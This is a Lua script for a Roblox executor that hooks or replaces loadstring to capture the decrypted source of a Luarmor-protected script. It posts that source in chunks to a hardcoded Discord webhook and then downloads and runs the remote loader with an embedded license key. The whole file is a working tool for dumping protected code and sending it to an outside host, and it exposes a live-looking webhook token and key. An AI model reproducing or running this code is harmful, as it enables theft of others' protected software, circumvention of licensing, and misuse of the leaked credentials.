--[[
  Capture source → Discord webhook only. Debug messages sent to same webhook.
]]

local _K = "XEBGtoEqCvrdDyGxWPpcKrHYKGxvrijf"
local _U = "https://api.luarmor.net/files/v4/loaders/d4d2ab3a331f01b3bad075746b35b9f7.lua"
local _W = "https://discord.com/api/webhooks/1479152924402647231/rtgjUt8LjlCdNjhIAdJGY9xJGDffQuH37d3kdy9DOPTcYycCW9Cd1J-6lYafDFFDP6-K"

local _n = 0
local _maxChunk = 3900

local function _post(content)
	pcall(function()
		if game and game.GetService then
			game:GetService("HttpService"):PostAsync(_W, game:GetService("HttpService"):JSONEncode({ content = tostring(content) }))
		elseif type(request) == "function" then
			local q = ("%q"):format(tostring(content):gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r"))
			request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = "{\"content\":" .. q .. "}" })
		end
	end)
end

local function _debug(msg)
	_post("[DEBUG] " .. tostring(msg))
end

local function _send(s)
	if type(s) ~= "string" or #s < 600 then return end
	_n = _n + 1
	(task and task.defer or spawn or function(f) f() end)(function()
		pcall(function()
			if game and game.GetService then
				local H = game:GetService("HttpService")
				local parts = math.ceil(#s / _maxChunk)
				for i = 1, parts do
					local chunk = s:sub((i - 1) * _maxChunk + 1, i * _maxChunk)
					local title = parts > 1 and ("#%d (%d/%d)"):format(_n, i, parts) or ("#%d"):format(_n)
					H:PostAsync(_W, H:JSONEncode({
						content = ("%d chars"):format(#s),
						embeds = { { title = title, description = "```lua\n" .. chunk .. "\n```" } }
					}))
				end
			elseif type(request) == "function" then
				local q = function(x) return ("%q"):format(tostring(x):gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r")) end
				local chunk = s:sub(1, _maxChunk)
				local more = #s > _maxChunk and "\n..." or ""
				request({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = "{\"content\":" .. q(#s .. " chars") .. ",\"embeds\":[{\"description\":" .. q("```lua\n" .. chunk .. more .. "\n```") .. "}]}" })
			end
		end)
	end)
end

_debug("Script started")

local _real = loadstring
local _d = debug
local _useHook = _d and _d.sethook and _d.getinfo and _d.getlocal

if _useHook then
	_debug("Using debug hook (will remove after first loadstring so it doesn't freeze)")
	-- Only hook for the FIRST loadstring call (the loader). Then remove hook and use wrapper so we don't freeze.
	local _hookActive = true
	_d.sethook(function(ev)
		if ev ~= "call" or not _hookActive then return end
		local info = _d.getinfo(2, "f")
		if not info or not info.func then return end
		if info.func ~= _real then return end
		local _, src = _d.getlocal(2, 1)
		_debug("loadstring called, len=" .. (type(src) == "string" and #src or 0) .. " – removing hook, using wrapper")
		_hookActive = false
		_d.sethook()
		-- From now on use wrapper so next loadstring (decrypted) gets captured
		loadstring = function(src2, name)
			if type(src2) == "string" then _send(src2) end
			return _real(src2, name)
		end
	end, "c")
else
	_debug("Using loadstring wrapper (debug.sethook not available)")
	loadstring = function(src, name)
		if type(src) == "string" then _send(src) end
		return _real(src, name)
	end
end

_debug("Calling loader: GetHttp + loadstring...")
local ok, err = pcall(function()
	script_key = _K
	loadstring(game:HttpGet(_U))()
end)
if not ok then
	_debug("ERROR: " .. tostring(err))
end
